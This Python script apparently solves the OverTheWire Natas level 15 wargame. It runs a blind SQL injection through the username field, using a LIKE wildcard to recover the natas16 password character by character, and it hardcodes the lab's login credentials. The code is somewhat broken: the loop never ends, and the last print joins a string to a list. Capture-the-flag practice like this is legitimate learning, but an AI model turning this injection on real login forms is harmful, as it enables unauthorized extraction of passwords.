import requests
import re
from string import *

chars = lowercase + uppercase + digits 
confirmed_pass = list()


print(chars)
username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://natas15.natas.labs.overthewire.org'

# Wont be able to explicitly inject SQL - using LIKE, "c%" will test to see if the pw matches c follwed by wildcard
session = requests.Session()

confirmed_pass = list()
while (True):
  for ch in chars:
    #print("Attempting w/pw ", "".join(confirmed_pass) + ch)
    post = session.post(url, data = {"username":'natas16" AND BINARY password LIKE "' + "".join(confirmed_pass) + ch + '%" # '}, auth = (username, password))
    content = post.text
    print(confirmed_pass)
    if('user exists' in content):
        confirmed_pass.append(ch)
        break
print("END:" + confirmed_pass)